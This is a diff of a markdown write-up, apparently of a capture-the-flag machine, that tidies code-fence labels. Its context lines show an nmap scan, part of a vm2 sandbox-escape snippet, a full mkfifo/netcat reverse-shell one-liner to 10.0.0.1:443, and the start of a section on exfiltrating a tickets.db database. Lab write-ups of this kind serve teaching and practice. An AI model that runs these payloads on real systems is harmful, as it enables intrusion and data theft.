@@ -7,13 +7,11 @@ author: Leon
 date: 2024-03-23
 cover: /media/1 2zqbeP26SB5iDgOINWaPfQ-3674822343.png
 ---
+![](/media/1%202zqbeP26SB5iDgOINWaPfQ-3674822343.png)  
+  
 Port Enumeration:
 
 We conducted a port scan to assess the available ports on the target IP using the following command:
-
-```
-bash
-```
 
 ```
 nmap -p- --min-rate 5000 $TARGET -sV 
@@ -45,10 +43,6 @@ Research into known vulnerabilities for the Node.js library led to a post on Git
 The vulnerable code snippet is as follows:
 
 ```
-javascript
-```
-
-```
 const {VM} = require("vm2");
 const vm = new VM();
 const code =  err = {};
@@ -74,20 +68,12 @@ Executing a bash command such as `ls` or `whoami` confirms the functionality of 
 Now, it's time for Remote Code Execution (RCE)! I utilized the following payload for this purpose:
 
 ```
-bash
-```
-
-```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f
 ```
 
 This payload establishes a reverse shell to 10.0.0.1 on port 443.
 
 Additionally, we discovered a database file located at `/var/www/contacts/tickets.db`. To exfiltrate the file, we utilized the following method:
-
-```
-bash
-```
 
 ```
 # Listen to files
